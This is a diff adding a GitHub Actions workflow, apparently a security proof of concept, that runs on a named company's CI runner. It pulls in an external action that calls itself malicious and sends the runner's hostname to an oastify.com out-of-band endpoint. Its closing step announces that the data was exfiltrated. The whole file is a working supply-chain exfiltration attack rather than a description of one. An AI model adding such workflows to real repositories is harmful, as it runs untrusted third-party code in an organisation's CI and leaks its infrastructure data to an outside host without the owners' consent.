@@ -1,0 +1,27 @@
+name: Simple Organization Attack Demo
+
+# This workflow demonstrates loading external malicious actions
+# into organization repositories for security testing
+
+on:
+  workflow_dispatch:
+
+jobs:
+  attack-demo:
+    runs-on: af-slim-prd  # Using AppsFlyer runner
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Load External Malicious Action
+        uses: sagiDinar/github-actions-security-poc/malicious-action-demo@master
+        with:
+          target_endpoint: 'pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com'
+          data_type: 'hostname'
+      
+      - name: Attack Summary
+        run: |
+          echo "=== EXTERNAL ACTION ATTACK SUCCESSFUL ==="
+          echo "Successfully loaded malicious action from external repository"
+          echo "Data exfiltrated to: pxq5e1pis82o7p125z9urcjyqpwgk68v.oastify.com"
+          echo "Check your OAST endpoint for received data!"
